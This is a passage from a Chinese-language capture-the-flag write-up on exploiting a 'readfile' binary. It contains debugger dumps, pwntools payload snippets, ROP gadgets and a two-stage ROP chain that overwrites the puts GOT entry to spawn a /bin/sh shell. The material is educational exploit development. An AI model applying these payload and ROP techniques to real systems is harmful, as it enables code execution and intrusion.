       f 5 63616177
       f 6 63616178
       f 7 63616179
       f 8 6461617a
       f 9 64616162
       f 10 64616163
    Program received signal SIGSEGV
在这里，我们看到因为 esi 是循环字符串 paac 的一部分，从而不能取消引用esi +
0x46，所以才发生了崩溃。我们还不确定这在文件结构中意味着什么，所以来看看如果将 paac 设置为任意的有效地址是否可以绕过这个问题。首先，让我们将
esi 值设置为我们的文件名值。
    $ r2 readfile 
    [0x08048640]> aaa
    [0x08048640]> s obj.name
    [0x0804a0a0]>
在脚本中更新 paac (win_2.py 在 Github) 偏移量的值。
    data = 'a' * cyclic_find('paac')
    data += p32(0x804a0a0) # Global address for obj.name
    data += 'b' * (1000 - len(data))
    write_file(filename, data)
然后出现了下面这样的崩溃问题。
    [----------------------REGISTERS-----------------------]
    ...
    *EDI  0x41415241 ('ARAA')
    ...
    [-------------------------CODE-------------------------]
     => 0xf76a9d40      cmp    ebp, dword ptr [edi + 8]
        0xf76a9d43      je     0xf76a9d69          
所以可以看到我们的
edi值指向的是文件名中循环的一部分。这次，将ARAA值替换为无效的文件名地址。结果就是，我们尝试了几个不同的无效地址，都不会导致这样的崩溃。我们的有效地址存在于可写模块当中︰
0x804af00 (在 Github win_3.py)。
这次，我们遇到了一次有趣的崩溃现象。
    [----------------------REGISTERS-----------------------]
    *EAX  0x41414141 ('AAAA')
     EBX  0xf7710000  0x804a0a0 (name)  0xf768da8d    call   dword ptr [eax + 0x3c]
在我们控制 eax调用 [eax + 0x3c]时发生了崩溃。这意味着我们可以将 eax 设置为任何地址减去
0x3c（计算所得），并调用任何函数。值得一提的是，我们还控制了 ebp。这非常有趣，因为将 ebp 设置为任何我们控制的地址，并使用一个 leave;
ret ROP小工具将我们的堆栈旋转到任何位置。(见 Github win_4.py)
    leaveret = 0x80486f1
    data = p32(leaveret)
    data2 = 'c' * cyclic_find('aaca')
    data2 += p32(0x04a0f000) # Use one of the next 0x08 bytes here for the address 0x0804a0f0 (some bytes into the filename)
    data2 += 'x08' * (cyclic_find('ARAA', alphabet=string.ascii_uppercase) - 4 - len(data2))
    data += data2
    data += p32(0x804af00)      # 2) Some valid address to pass fclose
    data += p32(0x804a0a5-0x3c) # 3) Address we will be calling at instruction call [eax + 0x3c]
    data += cyclic(240-len(data), alphabet=string.ascii_uppercase)
    filename = '/tmp/' + data
下面，我们为内存添加安装一个 ROP 链来进行完整的执行过程。  
    [----------------------REGISTERS-----------------------]
    ...
    *EBP  0x41414141 ('AAAA')
    *ESP  0x804a0f8 (name+88)   f 0 41414142
       f 1 41414143
       f 2 41414144
       f 3 41414145
       f 4 41414146
**现在我们看一下 ROP**
****
* * *
通过读取服务器上的 /etc/os-release，我们知道该服务器是 Ubuntu 14 机器。我们现在使用的也是 Ubuntu 14
机，所以我们假定这是相同的 libc。（请注意，由于游戏服务器已经过期，所以我们最后没有在该游戏服务器中测试这个链接。先假设本地环境与游戏服务器完全一致)
有很多 ROP 链的可能结果，所以让我们尝试调用magic ROP gadget来从libc中调用execve('/ bin/sh '，0，0)。我们在
libc_base + 0x40069 里面发现了这个小工具。通常情况下，用户会在之前就调用它，但因为我们在过程中重写了，所以我们可以简单地将 eax
设置为/bin/sh，然后调用其余的操作说明。
  *     text:00040069                 mov     [esp+16Ch+status], eax
  *     text:0004006C                 call    execve
使用ROPgadget –depth 50 –binary readfile可以在二进制文件中发现两个有用的小工具。
    0x080486af : mov eax, dword ptr [0x804a088] ; cmp eax, ebx ; jb 0x80486ba ; mov byte ptr [0x804a084], 1 ; add esp, 4 ; pop ebx ; pop ebp ; ret
    0x080486be : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
结果就是，在此二进制文件没有一个简单的pop eax; ret，所以我们必须现写一个值放入eax 。这时候第一个小工具就派上用场了。第一个小工具会从
0x804a088 取出某个值，然后将该值放入 eax。现在我们要问"我们怎样才能在
0x804a088中得到一个值"？幸运的是，gets可以直接进入二进制文件。所以我们能够将一个值放入 eax 的保险做法如下︰
ROP进入gets(0x804a088)
发送一个存储在 0x804a088的值
ROP进入 0x80486af中将那个值放入eax
我们需要预设 ebx 为零，以使它永远无法通过 cmp eax、 ebx 检查。利用一个简单的pop ebx; pop ebp;
ret就很容易达到。这个相同的小工具之后，我们还会看到一个pop ebx。所以还可以利用这个小工具将任意值放入
ebx。这很重要，因为第二个工具可以用来在地址+ 0x5d5b04c4将一个常量添加到 ebx 。
我们的攻击计划是将一个常量值添加到puts GOT条目，这样结果就会指向 libc 地址。我们可以通过使用
pwntools找出所需添加的值（我们选择任意添加）。
    >>> from pwn import *
    >>> elf = ELF('libc-2.19.so')
    >>> # 0x40069 is from the above magic libc offset
    >>> print(0x40069 - elf.symbols['puts'])
    -153075
    >>> hex(0xffffffff-153075)
    '0xfffdaa19'
这时，我们可以简单地调用puts来调用我们的神奇函数，并使用外壳程序。
让我们看看如何在ROP链中将这一计划付诸行动︰
**  
**
**ROP链1**
* * *
因为我们目前内存有限，所以直接使用接下来的0x804a000 块调用 gets，这将使我们能够拥有更大的 ROP 链。
发送第二个ROP链。
枢轴堆栈到这个新的地址，所以我们现在可以执行一个多大的 ROP 链。
**  
**
**ROP 链2**
* * *
调用gets(0x804a088)。
发送 0xfffdaa18 来存储数值到0x804a08c。
用正确堆栈调用Ebx 到 0xfffdaa13 mov eax ，将 puts-0x5d5b04c4
调用到eax（由于重新添加的小工具提出0x5d5b04c4 ）。
调用 0x80486be 添加常数到 puts ，来获得魔法 libc 地址。
调用 gets(0x804af00) 将字符串 /bin/sh放入内存。
调用 gets(0x804a088)，将指向字符串 /bin/sh 的指针放入到内存中，为第一个小工具做准备。
调用第一个工具将指向/bin/sh 的指针放入eax。
调用puts来触发libc小工具。
最终的代码可以在 Github 的 win_5.py 中找到。